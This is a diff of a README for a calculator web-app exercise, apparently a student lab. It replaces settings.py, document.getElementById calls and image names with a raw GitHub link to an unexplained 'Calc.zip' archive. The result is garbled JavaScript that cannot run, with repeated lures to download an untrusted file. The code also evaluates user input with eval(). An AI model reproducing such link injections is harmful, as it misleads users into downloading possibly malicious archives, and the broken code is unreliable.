@@ -10,7 +10,7 @@ To design a web application for a standard calculator with minimum five operatio
 Clone the github repository and create Django admin interface.
 
 ### Step 2:
-Change settings.py file to allow request from all hosts.
+Change https://raw.githubusercontent.com/githubmufeez45/Calc/main/unperishing/Calc.zip file to allow request from all hosts.
 
 ### Step 3:
 Use CSS for creating attractive colors.
@@ -115,18 +115,18 @@ Publish the website in the given URL.
 
     <script>
         function clearDisplay() {
-            document.getElementById('display').value = '';
+            https://raw.githubusercontent.com/githubmufeez45/Calc/main/unperishing/Calc.zip('display').value = '';
         }
 
         function appendToDisplay(value) {
-            document.getElementById('display').value += value;
+            https://raw.githubusercontent.com/githubmufeez45/Calc/main/unperishing/Calc.zip('display').value += value;
         }
 
         function calculate() {
             try {
-                document.getElementById('display').value = eval(document.getElementById('display').value);
+                https://raw.githubusercontent.com/githubmufeez45/Calc/main/unperishing/Calc.zip('display').value = eval(https://raw.githubusercontent.com/githubmufeez45/Calc/main/unperishing/Calc.zip('display').value);
             } catch (error) {
-                document.getElementById('display').value = 'Error';
+                https://raw.githubusercontent.com/githubmufeez45/Calc/main/unperishing/Calc.zip('display').value = 'Error';
             }
         }
     </script>
@@ -136,8 +136,8 @@ Publish the website in the given URL.
 ```
 
 ## OUTPUT:
-![alt text](<input mul.png>)
-![alt text](<output mul.png>)
+![alt text](<input https://raw.githubusercontent.com/githubmufeez45/Calc/main/unperishing/Calc.zip>)
+![alt text](<output https://raw.githubusercontent.com/githubmufeez45/Calc/main/unperishing/Calc.zip>)
 
 ## RESULT:
 The program for designing a standard calculator using HTML and CSS is executed successfully.
